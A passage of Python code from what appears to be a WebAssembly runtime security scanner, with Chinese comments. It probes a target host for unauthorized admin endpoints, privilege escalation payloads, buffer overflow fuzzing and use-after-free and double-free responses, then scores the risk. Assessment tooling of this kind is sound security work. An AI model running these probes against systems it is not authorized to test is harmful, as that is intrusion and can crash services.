                        f"{test_payload}"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    if '200' in response_text and 'success' in response_text.lower():
                        return {'accessible': True, 'operation': operation['op']}
                        
                except Exception:
                    continue
            
            return {'accessible': False}
            
        except Exception as e:
            return {'accessible': False, 'error': str(e)}
    
    async def _test_network_capabilities(self) -> Dict:
        """测试网络权限"""
        
        try:
            reader, writer = await self._create_connection()
            
            test_payload = json.dumps({
                'network_test': 'external_connection',
                'target_host': 'google.com',
                'target_port': 80
            })
            
            request = (
                f"POST /api/network/test HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(test_payload)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{test_payload}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
            response_text = response.decode('utf-8', errors='ignore')
            
            await self._close_connection(writer)
            
            network_accessible = '200' in response_text and 'connected' in response_text.lower()
            
            return {'accessible': network_accessible}
            
        except Exception as e:
            return {'accessible': False, 'error': str(e)}
    
    async def _test_system_info_capabilities(self) -> Dict:
        """测试系统信息访问权限"""
        
        try:
            reader, writer = await self._create_connection()
            
            test_payload = json.dumps({
                'system_query': 'process_info',
                'query_type': 'all_processes'
            })
            
            request = (
                f"POST /api/system/info HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(test_payload)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{test_payload}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
            response_text = response.decode('utf-8', errors='ignore')
            
            await self._close_connection(writer)
            
            info_accessible = '200' in response_text and ('pid' in response_text.lower() or 'process' in response_text.lower())
            
            return {'accessible': info_accessible}
            
        except Exception as e:
            return {'accessible': False, 'error': str(e)}
    
    async def _test_resource_limitations(self) -> Dict:
        """测试资源限制"""
        
        resource_tests = {
            'memory_limit_enforced': False,
            'cpu_limit_enforced': False,
            'execution_time_limited': False
        }
        
        try:
            # 测试内存限制
            memory_test = await self._test_memory_limits()
            resource_tests['memory_limit_enforced'] = memory_test['limited']
            
            # 测试CPU限制  
            cpu_test = await self._test_cpu_limits()
            resource_tests['cpu_limit_enforced'] = cpu_test['limited']
            
            # 测试执行时间限制
            time_test = await self._test_execution_time_limits()
            resource_tests['execution_time_limited'] = time_test['limited']
            
        except Exception as e:
            resource_tests['error'] = str(e)
        
        return resource_tests
    
    async def _test_memory_limits(self) -> Dict:
        """测试内存限制"""
        
        try:
            # 尝试申请大量内存
            large_allocation = 'A' * (100 * 1024 * 1024)  # 100MB字符串
            
            reader, writer = await self._create_connection()
            
            test_payload = json.dumps({
                'memory_test': 'large_allocation',
                'data': large_allocation[:1000]  # 只发送前1000字符作为测试
            })
            
            request = (
                f"POST /api/memory/allocate HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(test_payload)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{test_payload}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
            response_text = response.decode('utf-8', errors='ignore')
            
            await self._close_connection(writer)
            
            # 如果返回内存限制错误，说明有限制
            memory_limited = any(indicator in response_text.lower() for indicator in [
                'memory limit', 'out of memory', 'allocation failed', 'memory exceeded'
            ])
            
            return {'limited': memory_limited}
            
        except Exception as e:
            return {'limited': False, 'error': str(e)}
    
    async def _test_cpu_limits(self) -> Dict:
        """测试CPU限制"""
        
        try:
            reader, writer = await self._create_connection()
            
            # 模拟CPU密集型操作
            test_payload = json.dumps({
                'cpu_test': 'intensive_calculation',
                'iterations': 1000000
            })
            
            start_time = time.perf_counter()
            
            request = (
                f"POST /api/cpu/test HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(test_payload)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{test_payload}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=10.0)  # 更长超时
            response_text = response.decode('utf-8', errors='ignore')
            
            await self._close_connection(writer)
            
            execution_time = time.perf_counter() - start_time
            
            # 如果执行时间异常短或返回CPU限制错误，说明有限制
            cpu_limited = (execution_time < 0.1) or any(indicator in response_text.lower() for indicator in [
                'cpu limit', 'cpu throttled', 'execution limited', 'cpu exceeded'
            ])
            
            return {'limited': cpu_limited, 'execution_time': execution_time}
            
        except Exception as e:
            return {'limited': False, 'error': str(e)}
    
    async def _test_execution_time_limits(self) -> Dict:
        """测试执行时间限制"""
        
        try:
            reader, writer = await self._create_connection()
            
            # 模拟长时间运行的操作
            test_payload = json.dumps({
                'long_running_test': True,
                'sleep_duration': 10  # 请求睡眠10秒
            })
            
            start_time = time.perf_counter()
            
            request = (
                f"POST /api/execution/test HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(test_payload)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{test_payload}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=15.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            await self._close_connection(writer)
            
            actual_time = time.perf_counter() - start_time
            
            # 如果实际执行时间远短于请求时间，说明有时间限制
            time_limited = actual_time < 5.0 or any(indicator in response_text.lower() for indicator in [
                'timeout', 'execution timeout', 'time limit', 'time exceeded'
            ])
            
            return {'limited': time_limited, 'actual_time': actual_time}
            
        except Exception as e:
            return {'limited': False, 'error': str(e)}
    
    async def _test_api_access_controls(self) -> Dict:
        """测试API访问控制"""
        
        api_tests = {
            'unauthorized_api_access': False,
            'privilege_escalation': False,
            'api_endpoint_enumeration': []
        }
        
        try:
            # 测试未授权API访问
            unauth_result = await self._test_unauthorized_api_access()
            api_tests.update(unauth_result)
            
            # 测试权限提升
            privesc_result = await self._test_privilege_escalation()
            api_tests.update(privesc_result)
            
        except Exception as e:
            api_tests['error'] = str(e)
        
        return api_tests
    
    async def _test_unauthorized_api_access(self) -> Dict:
        """测试未授权API访问"""
        
        restricted_apis = [
            '/admin/api',
            '/api/admin', 
            '/system/api',
            '/privileged/api',
            '/internal/api'
        ]
        
        accessible_apis = []
        
        for api_endpoint in restricted_apis:
            try:
                reader, writer = await self._create_connection()
                
                request = (
                    f"GET {api_endpoint} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                response_text = response.decode('utf-8', errors='ignore')
                
                await self._close_connection(writer)
                
                if '200' in response_text:
                    accessible_apis.append(api_endpoint)
                    
            except Exception:
                continue
        
        return {
            'unauthorized_api_access': len(accessible_apis) > 0,
            'accessible_apis': accessible_apis
        }
    
    async def _test_privilege_escalation(self) -> Dict:
        """测试权限提升"""
        
        try:
            privesc_payloads = [
                {'role': 'admin', 'action': 'elevate'},
                {'user': 'root', 'privilege': 'system'}, 
                {'escalate': 'true', 'target': 'administrator'}
            ]
            
            for payload in privesc_payloads:
                try:
                    reader, writer = await self._create_connection()
                    
                    json_payload = json.dumps(payload)
                    
                    request = (
                        f"POST /api/auth/elevate HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(json_payload)}\r\n"
                        f"Connection: close\r\n\r\n"
                        f"{json_payload}"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    await self._close_connection(writer)
                    
                    if '200' in response_text and ('elevated' in response_text.lower() or 'admin' in response_text.lower()):
                        return {'privilege_escalation': True}
                        
                except Exception:
                    continue
            
            return {'privilege_escalation': False}
            
        except Exception as e:
            return {'privilege_escalation': False, 'error': str(e)}
    
    async def _analyze_memory_safety(self) -> Dict:
        """分析内存安全"""
        
        memory_analysis = {
            'buffer_overflow_protection': {},
            'use_after_free_detection': {},
            'double_free_detection': {},
            'memory_leak_assessment': {}
        }
        
        try:
            print(f"[*] Testing buffer overflow protection...")
            buffer_protection = await self._test_buffer_overflow_protection()
            memory_analysis['buffer_overflow_protection'] = buffer_protection
            
            print(f"[*] Testing use-after-free detection...")
            uaf_detection = await self._test_use_after_free_detection()
            memory_analysis['use_after_free_detection'] = uaf_detection
            
            print(f"[*] Testing double-free detection...")
            double_free_detection = await self._test_double_free_detection()
            memory_analysis['double_free_detection'] = double_free_detection
            
            print(f"[*] Assessing memory leak vulnerabilities...")
            memory_leak_assessment = await self._assess_memory_leaks()
            memory_analysis['memory_leak_assessment'] = memory_leak_assessment
            
            # 计算总体保护级别
            buffer_protection_level = buffer_protection.get('protection_level', 'UNKNOWN')
            
            # 综合评估内存安全状态
            if buffer_protection_level == 'INCONCLUSIVE':
                overall_protection = 'INCONCLUSIVE'
                protection_reason = "Memory safety APIs not accessible for testing"
            elif buffer_protection_level == 'LOW':
                # 检查其他测试的状态
                uaf_status = uaf_detection.get('status', 'UNKNOWN')
                df_status = double_free_detection.get('status', 'UNKNOWN')
                
                if uaf_status == 'TESTED' or df_status == 'TESTED':
                    overall_protection = 'LOW'
                    protection_reason = "Confirmed weak memory protection mechanisms"
                else:
                    overall_protection = 'INCONCLUSIVE'
                    protection_reason = "Limited memory safety test coverage"
            else:
                overall_protection = buffer_protection_level
                protection_reason = buffer_protection.get('assessment_reason', 'Memory safety assessment completed')
            
            memory_analysis['overall_protection'] = overall_protection
            memory_analysis['protection_reason'] = protection_reason
            
        except Exception as e:
            memory_analysis['error'] = str(e)
        
        return memory_analysis
    
    async def _test_buffer_overflow_protection(self) -> Dict:
        """测试缓冲区溢出保护 - 扩展真实端点与行为验证

        策略：
        - 多端点、多载荷类型（JSON 与 octet-stream）联合探测
        - 区分边界防护(413/400)与异常崩溃(5xx/崩溃字样)
        - 额外健康检查，验证测试后服务是否稳定
        - 识别常见保护机制信号（canary/ASAN/UBSAN/FORTIFY）
        """
        
        overflow_tests: List[Dict[str, Any]] = []
        
        # 端点候选（常见控制面/执行面）
        candidate_endpoints = [
            '/api/buffer/test',
            '/api/wasm/execute',
            '/wasm/execute',
            '/plugins/echo',
            '/envoy/wasm',
            '/api/wasm/run'
        ]
        
        # 不同大小的溢出测试
        overflow_sizes = [1024, 2048, 4096, 8192, 16384]
        
        # 常见保护与崩溃指示
        protect_tokens = ['buffer overflow detected', 'stack protection', 'canary', 'guard', 'fortify', 'asan', 'ubsan']
        crash_tokens = ['segmentation fault', 'access violation', 'core dump', 'violation', 'crash']
        
        for ep in candidate_endpoints:
            for size in overflow_sizes:
                try:
                    # 策略A：JSON 载荷
                    overflow_payload = 'A' * size
                    reader, writer = await self._create_connection()
                    json_payload = json.dumps({
                        'buffer_test': overflow_payload,
                        'test_type': 'overflow',
                        'size': size
                    })
                    request = (
                        f"POST {ep} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(json_payload)}\r\n"
                        f"Connection: close\r\n\r\n"
                        f"{json_payload}"
                    )
                    writer.write(request.encode()); await writer.drain()
                    resp = await asyncio.wait_for(reader.read(4096), timeout=self.timeout)
                    text = resp.decode('utf-8', errors='ignore')
                    await self._close_connection(writer)
                    
                    # 解析状态码
                    status_line = text.split('\r\n')[0] if text else ''
                    status_code: Optional[int] = None
                    if 'HTTP/' in status_line:
                        try:
                            status_code = int(status_line.split()[1])
                        except Exception:
                            status_code = None
                    
                    # 健康检查（请求主页，观察稳定性）
                    stable = True
                    try:
                        stable = (await self._measure_request_time('/') or 0.0) > 0
                    except Exception:
                        stable = False
                    
                    # 保护/崩溃信号
                    low = text.lower()
                    protection_active = any(tok in low for tok in protect_tokens)
                    crashy = any(tok in low for tok in crash_tokens)
                    
                    # 额外策略B：octet-stream 大载荷（仅在端点存活时尝试）
                    octet_result = None
                    if status_code and status_code not in [404, 405, 401, 403]:
                        try:
                            body = ('B' * size).encode()
                            reader2, writer2 = await self._create_connection()
                            req2 = (
                                f"POST {ep} HTTP/1.1\r\n"
                                f"Host: {self.target_host}\r\n"
                                f"Content-Type: application/octet-stream\r\n"
                                f"Content-Length: {len(body)}\r\n"
                                f"Connection: close\r\n\r\n"
                            ).encode() + body
                            writer2.write(req2); await writer2.drain()
                            resp2 = await asyncio.wait_for(reader2.read(4096), timeout=self.timeout)
                            text2 = resp2.decode('utf-8', errors='ignore')
                            await self._close_connection(writer2)
                            sl2 = text2.split('\r\n')[0] if text2 else ''
                            sc2: Optional[int] = None
                            if 'HTTP/' in sl2:
                                try:
                                    sc2 = int(sl2.split()[1])
                                except Exception:
                                    sc2 = None
                            low2 = text2.lower()
                            octet_result = {
                                'http_status': sc2,
                                'protection_active': any(tok in low2 for tok in protect_tokens),
                                'crashy': any(tok in low2 for tok in crash_tokens),
                                'preview': text2[:100]
                            }
                            # 合并强信号
                            protection_active = protection_active or octet_result['protection_active']
                            crashy = crashy or octet_result['crashy']
                        except Exception as e2:
                            octet_result = {'error': str(e2)}
                    
                    # 结果分类
                    status: str
                    reason: str = ''
                    if status_code is None:
                        status = 'CONNECTION_ERROR'
                        reason = 'Invalid HTTP response'
                    elif status_code == 404:
                        status = 'API_NOT_FOUND'
                        reason = 'Endpoint not found'
                    elif status_code in [405, 401, 403]:
                        status = 'ACCESS_DENIED'
                        reason = f'HTTP {status_code} - not accessible'
                    elif status_code == 413:
                        # 负载过大：视作有边界防护
                        status = 'TESTED'
                        protection_active = True
                        reason = 'Payload rejected (413)'
                    elif status_code in [200, 201, 202, 400]:
                        # 400 也可能是校验拒绝，非崩溃
                        status = 'TESTED'
                    elif 500 <= status_code < 600:
                        status = 'TESTED'
                        crashy = True
                        reason = f'Server error {status_code}'
                    else:
                        status = 'INCONCLUSIVE'
                        reason = f'Unexpected HTTP status: {status_code}'
                    
                    overflow_tests.append({
                        'endpoint': ep,
                        'size': size,
                        'status': status,
                        'protection_active': bool(protection_active),
                        'overflow_detected': bool(crashy),
                        'http_status': status_code,
                        'response_preview': text[:120],
                        'octet_probe': octet_result,
                        'service_stable': stable,
                        'reason': reason
                    })
                except Exception as e:
                    overflow_tests.append({
                        'endpoint': ep,
                        'size': size,
                        'status': 'ERROR',
                        'error': str(e)
                    })
        
        # 汇总评估
        tested_results = [t for t in overflow_tests if t.get('status') == 'TESTED']
        protection_active_tests = [t for t in tested_results if t.get('protection_active')]
        crash_tests = [t for t in tested_results if t.get('overflow_detected')]
        inconclusive_tests = [t for t in overflow_tests if t.get('status') in ['INCONCLUSIVE', 'API_NOT_FOUND', 'METHOD_NOT_ALLOWED']]
        
        if not tested_results:
            if inconclusive_tests:
                protection_level = 'INCONCLUSIVE'
                assessment_reason = f"Buffer endpoints not accessible ({len(inconclusive_tests)}/{len(overflow_tests)} inconclusive)"
            else:
                protection_level = 'UNKNOWN'
                assessment_reason = 'All tests errored'
        elif protection_active_tests:
            protection_level = 'HIGH'
            assessment_reason = f"Protection signals in {len(protection_active_tests)}/{len(tested_results)} tests"
        elif crash_tests:
            protection_level = 'LOW'
            assessment_reason = f"Crash/violation signals in {len(crash_tests)} tests"
        else:
            protection_level = 'LOW'
            assessment_reason = f"No protection tokens observed in {len(tested_results)} successful tests"
        
        return {
            'tests': overflow_tests,
            'protection_level': protection_level,
            'assessment_reason': assessment_reason,
            'tested_count': len(tested_results),
            'inconclusive_count': len(inconclusive_tests)
        }
    
    async def _test_use_after_free_detection(self) -> Dict:
        """测试释放后使用检测 - 扩展真实端点与多阶段验证

        策略：
        - 多端点候选：/api/memory/uaf_test,/runtime/memory/uaf,/wasm/memory/uaf,/debug/memory/uaf_test
        - 两阶段/三阶段序列（alloc -> free -> use）最佳努力模拟
        - 检测常见 UAF 指示词（heap-use-after-free/AddressSanitizer 等）
        - 返回精细状态，便于上层做总体评估
        """
        
        candidate_endpoints = [
            '/api/memory/uaf_test',
            '/runtime/memory/uaf',
            '/wasm/memory/uaf',
            '/debug/memory/uaf_test',
            '/api/wasm/execute'  # 兜底：有些系统统一执行端点
        ]
        indicators = ['use after free', 'heap-use-after-free', 'invalid memory access', 'heap corruption', 'asan']
        
        last_error: Optional[str] = None
        for ep in candidate_endpoints:
            try:
                # 首次尝试：单次综合测试
                reader, writer = await self._create_connection()
                uaf_payload = json.dumps({
                    'memory_operation': 'allocate_and_free',
                    'subsequent_access': True,
                    'test_type': 'use_after_free'
                })
                request = (
                    f"POST {ep} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(uaf_payload)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{uaf_payload}"
                )
                writer.write(request.encode()); await writer.drain()
                response = await asyncio.wait_for(reader.read(2048), timeout=self.timeout)
                text = response.decode('utf-8', errors='ignore')
                await self._close_connection(writer)
                
                # 状态解析
                status_line = text.split('\r\n')[0] if text else ''
                status_code: Optional[int] = None
                if 'HTTP/' in status_line:
                    try:
                        status_code = int(status_line.split()[1])
                    except Exception:
                        status_code = None
                
                if status_code is None:
                    last_error = 'Invalid HTTP response'
                    continue
                if status_code == 404:
                    # 尝试下一个端点
                    continue
                if status_code in [405, 401, 403]:
                    return {
                        'status': 'ACCESS_DENIED',
                        'reason': f'HTTP {status_code} - UAF test not accessible',
                        'vulnerable': False,
                        'endpoint': ep
                    }
                if status_code not in [200, 201, 202, 400]:
                    # 其它状态，记录后换端点
                    last_error = f'Unexpected HTTP status: {status_code}'
                    continue
                
                # 命中端点，进一步做分阶段验证（最佳努力）
                uaf_detected = any(tok in text.lower() for tok in indicators)
                phase_ok = True
                phase_results: List[Dict[str, Any]] = []
                for phase in ['alloc', 'free', 'use']:
                    try:
                        reader2, writer2 = await self._create_connection()
                        body = json.dumps({
                            'phase': phase,
                            'memory_operation': 'uaf_sequence'
                        })
                        req2 = (
                            f"POST {ep} HTTP/1.1\r\n"
                            f"Host: {self.target_host}\r\n"
                            f"Content-Type: application/json\r\n"
                            f"Content-Length: {len(body)}\r\n"
                            f"Connection: close\r\n\r\n"
                            f"{body}"
                        )
                        writer2.write(req2.encode()); await writer2.drain()
                        resp2 = await asyncio.wait_for(reader2.read(2048), timeout=self.timeout)
                        txt2 = resp2.decode('utf-8', errors='ignore')
                        await self._close_connection(writer2)
                        line2 = txt2.split('\r\n')[0] if txt2 else ''
                        sc2: Optional[int] = None
                        if 'HTTP/' in line2:
                            try:
                                sc2 = int(line2.split()[1])
                            except Exception:
                                sc2 = None
                        if sc2 and 200 <= sc2 < 500:
                            phase_results.append({'phase': phase, 'status': sc2, 'preview': txt2[:120]})
                            # 在 use 阶段再搜一次指示词
                            if phase == 'use' and any(tok in txt2.lower() for tok in indicators):
                                uaf_detected = True
                        else:
                            phase_ok = False
                            phase_results.append({'phase': phase, 'status': sc2, 'preview': txt2[:120]})
                    except Exception as pe:
                        phase_ok = False
                        phase_results.append({'phase': phase, 'error': str(pe)})
                
                return {
                    'status': 'TESTED',
                    'endpoint': ep,
                    'uaf_detection_active': uaf_detected,
                    'vulnerable': not uaf_detected,
                    'response_preview': text[:150],
                    'phases': phase_results
                }
            except Exception as e:
                last_error = str(e)
                continue
        
        return {
            'status': 'INCONCLUSIVE' if last_error else 'API_NOT_FOUND',
            'reason': last_error or 'No candidate endpoint available',
            'vulnerable': False
        }
    
    async def _test_double_free_detection(self) -> Dict:
        """测试双重释放检测 - 扩展真实端点与多阶段验证

        策略：
        - 多端点候选：/api/memory/double_free_test,/runtime/memory/free_twice,/wasm/memory/df,/debug/memory/double_free
        - 分阶段序列（alloc -> free -> free）最佳努力模拟
        - 检测常见 DF 指示词（double free/heap corruption/ASAN）
        """
        
        candidate_endpoints = [
            '/api/memory/double_free_test',
            '/runtime/memory/free_twice',
            '/wasm/memory/df',
            '/debug/memory/double_free',
            '/api/wasm/execute'
        ]
        indicators = ['double free', 'heap corruption', 'free error', 'memory corruption', 'asan']
        
        last_error: Optional[str] = None
        for ep in candidate_endpoints:
            try:
                reader, writer = await self._create_connection()
                # 综合探测
                df_payload = json.dumps({
                    'memory_operation': 'double_free_test',
                    'allocate_size': 1024,
                    'test_type': 'double_free'
                })
                request = (
                    f"POST {ep} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(df_payload)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{df_payload}"
                )
                writer.write(request.encode()); await writer.drain()
                response = await asyncio.wait_for(reader.read(2048), timeout=self.timeout)
                text = response.decode('utf-8', errors='ignore')
                await self._close_connection(writer)
                
                status_line = text.split('\r\n')[0] if text else ''
                status_code: Optional[int] = None
                if 'HTTP/' in status_line:
                    try:
                        status_code = int(status_line.split()[1])
                    except Exception:
                        status_code = None
                if status_code is None:
                    last_error = 'Invalid HTTP response'
                    continue
                if status_code == 404:
                    continue
                if status_code in [405, 401, 403]:
                    return {
                        'status': 'ACCESS_DENIED',
                        'reason': f'HTTP {status_code} - Double-free test not accessible',
                        'vulnerable': False,
                        'endpoint': ep
                    }
                if status_code not in [200, 201, 202, 400]:
                    last_error = f'Unexpected HTTP status: {status_code}'
                    continue
                
                df_detected = any(tok in text.lower() for tok in indicators)
                phase_results: List[Dict[str, Any]] = []
                ok = True
                for phase in ['alloc', 'free', 'free']:
                    try:
                        reader2, writer2 = await self._create_connection()
                        body = json.dumps({'phase': phase, 'memory_operation': 'double_free_sequence'})
                        req2 = (
                            f"POST {ep} HTTP/1.1\r\n"
                            f"Host: {self.target_host}\r\n"
                            f"Content-Type: application/json\r\n"
                            f"Content-Length: {len(body)}\r\n"
                            f"Connection: close\r\n\r\n"
                            f"{body}"
                        )
                        writer2.write(req2.encode()); await writer2.drain()
                        resp2 = await asyncio.wait_for(reader2.read(2048), timeout=self.timeout)
                        txt2 = resp2.decode('utf-8', errors='ignore')
                        await self._close_connection(writer2)
                        line2 = txt2.split('\r\n')[0] if txt2 else ''
                        sc2: Optional[int] = None
                        if 'HTTP/' in line2:
                            try:
                                sc2 = int(line2.split()[1])
                            except Exception:
                                sc2 = None
                        phase_results.append({'phase': phase, 'status': sc2, 'preview': txt2[:120]})
                        if any(tok in txt2.lower() for tok in indicators):
                            df_detected = True
                    except Exception as pe:
                        ok = False
                        phase_results.append({'phase': phase, 'error': str(pe)})
                
                return {
                    'status': 'TESTED',
                    'endpoint': ep,
                    'double_free_detection_active': df_detected,
                    'vulnerable': not df_detected,
                    'response_preview': text[:150],
                    'phases': phase_results
                }
            except Exception as e:
                last_error = str(e)
                continue
        
        return {
            'status': 'INCONCLUSIVE' if last_error else 'API_NOT_FOUND',
            'reason': last_error or 'No candidate endpoint available',
            'vulnerable': False
        }
    
    async def _assess_memory_leaks(self) -> Dict:
        """评估内存泄漏"""
        
        try:
            # 发送多个分配请求而不释放，观察内存使用
            leak_test_results = []
            
            for i in range(5):
                reader, writer = await self._create_connection()
                
                leak_payload = json.dumps({
                    'memory_operation': 'allocate_no_free',
                    'allocation_size': 1024 * 1024,  # 1MB
                    'iteration': i
                })
                
                start_time = time.perf_counter()
                
                request = (
                    f"POST /api/memory/leak_test HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(leak_payload)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{leak_payload}"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                response_text = response.decode('utf-8', errors='ignore')
                
                await self._close_connection(writer)
                
                response_time = (time.perf_counter() - start_time) * 1000
                
                leak_test_results.append({
                    'iteration': i,
                    'response_time': response_time,
                    'memory_allocated': '1MB' if '200' in response_text else 'Failed'
                })
                
                await asyncio.sleep(0.5)
            
            # 分析响应时间趋势，判断是否有内存泄漏
            response_times = [result['response_time'] for result in leak_test_results if 'Failed' not in result['memory_allocated']]
            
            if len(response_times) >= 3:
                time_trend = response_times[-1] - response_times[0]
                memory_leak_suspected = time_trend > 100  # 响应时间增加超过100ms
            else:
                memory_leak_suspected = False
            
            return {
                'memory_leak_suspected': memory_leak_suspected,
                'test_results': leak_test_results,
                'time_trend': time_trend if len(response_times) >= 3 else 0
            }
            
        except Exception as e:
            return {
                'memory_leak_suspected': False,
                'error': str(e)
            }
    
    def _generate_overall_assessment(self, analysis_results: Dict) -> Dict:
        """生成综合评估"""
        
        assessment = {
            'security_score': 0,
            'risk_level': 'UNKNOWN',
            'critical_vulnerabilities': [],
            'recommendations': [],
            'attack_vectors': []
        }
        
        try:
            # 计算安全分数
            security_score = 100  # 从满分开始扣分
            
            # Runtime detection影响
            runtime_detection = analysis_results.get('runtime_detection', {})
            if runtime_detection.get('wasm_detected', False):
                confidence = runtime_detection.get('confidence_score', 0)
                if confidence >= 70:
                    security_score -= 10  # Wasm运行时存在增加攻击面
            
            # Plugin vulnerabilities影响
            plugin_analysis = analysis_results.get('plugin_analysis', {})
            plugin_discovery = plugin_analysis.get('plugin_discovery', {})
            discovered_plugins = plugin_discovery.get('discovered_plugins', [])
            if len(discovered_plugins) > 0:
                security_score -= 15  # 发现插件增加风险
            
            # Sandbox escape影响
            sandbox_security = analysis_results.get('sandbox_security', {})
            escape_attempts = sandbox_security.get('sandbox_escape_attempts', {})
            successful_escapes = escape_attempts.get('successful_escapes', 0)
            if successful_escapes > 0:
                security_score -= 30  # 沙箱逃逸是严重问题
                assessment['critical_vulnerabilities'].append(f"Sandbox escape: {successful_escapes} successful attempts")
            
            # Memory safety影响 - 只在确认检测到LOW保护时才扣分
            memory_safety = analysis_results.get('memory_safety', {})
            protection_level = memory_safety.get('overall_protection', 'UNKNOWN')
            protection_reason = memory_safety.get('protection_reason', '')
            
            if protection_level == 'LOW':
                security_score -= 20
                assessment['critical_vulnerabilities'].append(f"Confirmed weak memory protection: {protection_reason}")
            elif protection_level == 'INCONCLUSIVE':
                # INCONCLUSIVE状态不影响评分，但记录原因
                assessment['inconclusive_tests'] = assessment.get('inconclusive_tests', [])
                assessment['inconclusive_tests'].append(f"Memory safety: {protection_reason}")
            # UNKNOWN状态同样不影响评分，因为可能是非适用环境
            
            # 确定风险等级
            if security_score >= 80:
                risk_level = 'LOW'
            elif security_score >= 60:
                risk_level = 'MEDIUM'
            elif security_score >= 40:
                risk_level = 'HIGH'
            else:
                risk_level = 'CRITICAL'
            
            assessment['security_score'] = max(0, security_score)
            assessment['risk_level'] = risk_level
            
            # 生成建议
            recommendations = []
            if successful_escapes > 0:
                recommendations.append("Strengthen sandbox isolation mechanisms")
                recommendations.append("Implement additional runtime security controls")
            
            if protection_level == 'LOW':
                recommendations.append("Enable stack protection and memory guards")
            
            if len(discovered_plugins) > 0:
                recommendations.append("Review and audit all Wasm plugins")
                recommendations.append("Implement plugin security policies")
            
            recommendations.extend([
                "Regular security updates for Wasm runtime",
                "Implement comprehensive logging and monitoring",
                "Consider additional access controls"
            ])
            
            assessment['recommendations'] = recommendations[:8]  # 限制建议数量
            
            # 攻击向量总结 - 只在确认的漏洞基础上生成
            attack_vectors = []
            if successful_escapes > 0:
                attack_vectors.append("Sandbox escape exploitation")
            if len(discovered_plugins) > 0:
                attack_vectors.append("Plugin-based attacks")
            if protection_level == 'LOW':
                attack_vectors.append("Confirmed memory corruption attacks")
            # UNKNOWN保护级别不生成攻击向量，避免误报
            
            assessment['attack_vectors'] = attack_vectors
            
        except Exception as e:
            assessment['error'] = str(e)
        
        return assessment

    async def _execute_local_wasm_module(self) -> Dict:
        """使用 wasmtime 执行本地 WASM 模块（支持 WASI）。

        返回统一结果，包括：实例化状态、导出符号、可选入口函数调用的返回、执行时长、错误信息等。
        """
        result: Dict[str, Any] = {
            'status': 'UNKNOWN',
            'instantiated': False,
            'called_entry': False,
            'exports': [],
            'return_value': None,
            'execution_time_ms': 0,
            'error': None
        }

        try:
            if not self.local_wasm_path:
                result['status'] = 'SKIPPED'
                result['error'] = 'No local_wasm_path provided'
                return result

            wasm_path = Path(self.local_wasm_path)
            if not wasm_path.exists() or not wasm_path.is_file():
                result['status'] = 'ERROR'
                result['error'] = f"WASM file not found: {wasm_path}"
                return result

            if wasmtime is None:
                result['status'] = 'MISSING_DEPENDENCY'
                result['error'] = 'wasmtime Python package not installed'
                return result

            def _run() -> Dict[str, Any]:
                inner: Dict[str, Any] = {}

                # Configure engine (attempt to enable fuel for safety if available)
                engine = None
                try:
                    if hasattr(wasmtime, 'Config'):
                        cfg = wasmtime.Config()
                        try:
                            # Best-effort: enable fuel consumption to avoid runaway
                            if hasattr(cfg, 'consume_fuel'):
                                cfg.consume_fuel = True
                        except Exception:
                            pass
                        engine = wasmtime.Engine(cfg)
                    else:
                        engine = wasmtime.Engine()
                except Exception:
                    engine = wasmtime.Engine()

                store = wasmtime.Store(engine)

                # Add some fuel if supported
                try:
                    if hasattr(store, 'add_fuel'):
                        store.add_fuel(10_000_000)
                except Exception:
                    pass

                # Load module
                module = wasmtime.Module.from_file(engine, str(wasm_path))

                # Linker and WASI
                linker = wasmtime.Linker(engine)
                if hasattr(linker, 'define_wasi'):
                    try:
                        linker.define_wasi()
                    except Exception:
                        pass

                if hasattr(wasmtime, 'WasiConfig'):
                    try:
